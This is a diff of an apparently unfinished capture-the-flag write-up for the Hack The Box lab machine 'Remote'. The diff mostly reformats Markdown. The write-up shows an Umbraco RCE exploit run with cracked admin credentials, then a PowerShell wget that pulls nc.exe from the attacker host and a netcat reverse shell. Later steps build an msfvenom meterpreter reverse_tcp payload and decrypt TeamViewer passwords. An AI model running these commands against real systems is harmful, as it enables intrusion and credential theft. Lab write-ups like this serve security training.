@@ -1,9 +1,8 @@
-
 # HTB - Remote
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/9dba58d10cddb93939a2f0c0d6e0f97b7e65339b/windows-machines/easy/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -23,7 +22,7 @@ description with generic example
 
 I started my enumeration of this machine with an nmap scan of `10.10.10.180`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
 
-```
+```text
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 09:38 EDT
 Nmap scan report for 10.10.10.180
 Host is up (0.051s latency).
@@ -77,32 +76,27 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 102.49 seconds
 ```
 
-21/tcp   open  ftp
-80/tcp   open  http
-111/tcp  open  rpcbind
-135/tcp  open  msrpc
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-2049/tcp open  nfs
+21/tcp open ftp 80/tcp open http 111/tcp open rpcbind 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 2049/tcp open nfs
 
 start with anonymous ftp login - empty folder
 
-A search for umbraco+vulnerabilities = https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/
+A search for umbraco+vulnerabilities = [https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/](https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/)
 
-leads to http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx <screenshot>
+leads to [http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx](http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx) 
 
-https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html
+[https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html](https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html)
 
 rabbit hole?^
 
 Dirbuster found a huge list of standard Umbraco directories and files
 
-navigating to `/umbraco` redirects to a login page at http:10.10.10.180/umbraco/#/login.asp
+navigating to `/umbraco` redirects to a login page at http:10.10.10.180/umbraco/\#/login.asp
 
-https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/ - looks interesting, but didnt work
+[https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/](https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/) - looks interesting, but didnt work
 
-since rpc is open and showing mountd service: https://resources.infosecinstitute.com/exploiting-nfs-share
-```
+since rpc is open and showing mountd service: [https://resources.infosecinstitute.com/exploiting-nfs-share](https://resources.infosecinstitute.com/exploiting-nfs-share)
+
+```text
 zweilos@kali:~/htb/remote$ showmount -e 10.10.10.180
 Export list for 10.10.10.180:
 /site_backups (everyone)
@@ -140,26 +134,29 @@ drwx------  2 nobody 4294967294  4096 Feb 20 12:16 Umbraco_Client
 drwx------  2 nobody 4294967294  4096 Feb 20 12:16 Views
 -rwx------  1 nobody 4294967294 28539 Feb 20 00:57 Web.config
 ```
-file Web.config has line: <add key="umbracoConfigurationStatus" value="7.12.4" /> version number
 
-https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data
+file Web.config has line:  version number
 
-App_Data/Ubmbraco.sdf
+[https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data](https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data)
+
+App\_Data/Ubmbraco.sdf
 
 b8be16afba8c314ad33d812f22a04991b90e2aaa
 
 admin@htb.local:baconandcheese
 
-https://github.com/noraj/Umbraco-RCE
+[https://github.com/noraj/Umbraco-RCE](https://github.com/noraj/Umbraco-RCE)
 
 exploit.py
-```
+
+```text
 zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
 iis apppool\defaultapppool
 ```
-it works.  now time to enumerate the system (very slow however)
 
-```
+it works. now time to enumerate the system \(very slow however\)
+
+```text
 zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command ls'
 
     Directory: C:\windows\system32\inetsrv
@@ -175,7 +172,8 @@ d-----        2/19/2020   3:11 PM                MetaBack
 ...snipped...           
 -a----        2/19/2020   3:11 PM         169984 XPath.dll
 ```
-```
+
+```text
 Directory: C:\Users
 
 
@@ -189,7 +187,8 @@ d-----         7/5/2020   7:05 AM                Administrator
 d-----        2/19/2020   3:12 PM                Classic .NET AppPool                               
 d-r---        2/20/2020   2:42 AM                Public
 ```
-```
+
+```text
 zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command ping 10.10.15.82'
 
 Pinging 10.10.15.82 with 32 bytes of data:
@@ -203,28 +202,34 @@ Ping statistics for 10.10.15.82:
 Approximate round trip times in milli-seconds:
     Minimum = 43ms, Maximum = 193ms, Average = 81ms
 ```
+
 ## Initial Foothold
-```
+
+```text
 python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command wget 10.10.15.82:8090/nc.exe -OutFile C:\\Windows\\Temp\\n.exe'
 ```
+
 got a hit on my host
-```
+
+```text
 zweilos@kali:~$ python -m SimpleHTTPServer 8090
 Serving HTTP on 0.0.0.0 port 8090 ...
 10.10.10.180 - - [05/Jul/2020 20:28:42] "GET /nc32.exe HTTP/1.1" 200 -
 ```
+
 once nc.exe was on the box could now get a shell with:
-```
+
+```text
 zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'C:\\Windows\\Temp\\n.exe 10.10.15.82 9990 -e powershell.exe'
 ```
-
 
 ## Road to User
 
 ### Further enumeration
 
 ### Finding user creds
-```
+
+```text
 PS C:\> whoami /all
 whoami /all
 
@@ -268,11 +273,14 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 ERROR: Unable to get user claims information.
 ```
+
 not much
 
 ### User.txt
+
 didnt realize for a long time that I already was logged in as "User"; I had to hunt for the flag which was in the `Public` user folder `C:\Users\Public`
-```
+
+```text
 PS C:\Users\Public> type user.txt
 type user.txt
 2224ec331009752bfb3d7409cef3e36a
@@ -280,20 +288,18 @@ type user.txt
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User <username>
+### Enumeration as User
 
-```
+```text
 PS C:\> [Environment]::OSVersion
-[Environment]::OSVersion
-
 Platform ServicePack Version      VersionString                    
 -------- ----------- -------      -------------                    
  Win32NT             10.0.17763.0 Microsoft Windows NT 10.0.17763.0
 ```
-32bit windows 10
-teamviewer 7 installed, searching for exploit leads to https://whynotsecurity.com/blog/teamviewer/, there author has a python exploit, ~~need to compile to exe~~
-search manually in registry with powershell: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7
-```
+
+32bit windows 10 teamviewer 7 installed, searching for exploit leads to [https://whynotsecurity.com/blog/teamviewer/](https://whynotsecurity.com/blog/teamviewer/), there author has a python exploit, ~~need to compile to exe~~ search manually in registry with powershell: [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7)
+
+```text
 PS C:\Windows\Temp> Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\Teamviewer\Version7 
 Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\Teamviewer\Version7
 
@@ -325,32 +331,38 @@ PSChildName               : Version7
 PSDrive                   : HKLM
 PSProvider                : Microsoft.PowerShell.Core\Registry
 ```
+
 using the python exploit to decrypt the password store in the reg key
-```
+
+```text
 zweilos@kali:~/htb/remote$ python3 teamviewer-pass.py 
 00000000: 72 00 33 00 6D 00 30 00  74 00 65 00 5F 00 4C 00  r.3.m.0.t.e._.L.
 00000010: 30 00 67 00 69 00 6E 00  00 00 00 00 00 00 00 00  0.g.i.n.........
 None
 r3m0te_L0gin
 ```
-This password didn't seem to do me any good.  During research found a post exploit metasploit module that says it will find tv pass, I wanted to see if it was the same one.
-https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords
-https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md
 
-> Any Windows host with a `meterpreter` session and `TeamViewer 7+` installed. 
+This password didn't seem to do me any good. During research found a post exploit metasploit module that says it will find tv pass, I wanted to see if it was the same one. [https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer\_passwords](https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords) [https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer\_passwords.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md)
+
+> Any Windows host with a `meterpreter` session and `TeamViewer 7+` installed.
 
 So I will need a meterpreter session
 
 ### Getting a shell
-```
+
+```text
 zweilos@kali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.15.82 LPORT=4444 -f exe -o rev.exe
 ```
+
 sending msfvenom payload to remote system
-```
+
+```text
 python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'C:\\Windows\\Temp\\r.exe'
 ```
-https://security.stackexchange.com/questions/133722/how-to-set-reverse-tcp-connection-when-doing-pentesting-in-vms
-```
+
+[https://security.stackexchange.com/questions/133722/how-to-set-reverse-tcp-connection-when-doing-pentesting-in-vms](https://security.stackexchange.com/questions/133722/how-to-set-reverse-tcp-connection-when-doing-pentesting-in-vms)
+
+```text
 msf5 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
@@ -375,13 +387,17 @@ meterpreter > run post/windows/gather/credentials/teamviewer_passwords
 [*] TeamViewer's version is ''
 [-] Unable to find TeamViewer's process
 ```
+
 !R3m0te! from meterpreter, different than before...maybe this one works to log in.
 
 ### Root.txt
-```
+
+```text
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 ed57e228cd4d76d6987d89fae6d5a77d
 ```
-Thanks to [`mrb3n`](https://www.hackthebox.eu/home/users/profile/2984) for <something interesting or useful about this machine.
+
+Thanks to [`mrb3n`](https://www.hackthebox.eu/home/users/profile/2984) for &lt;something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
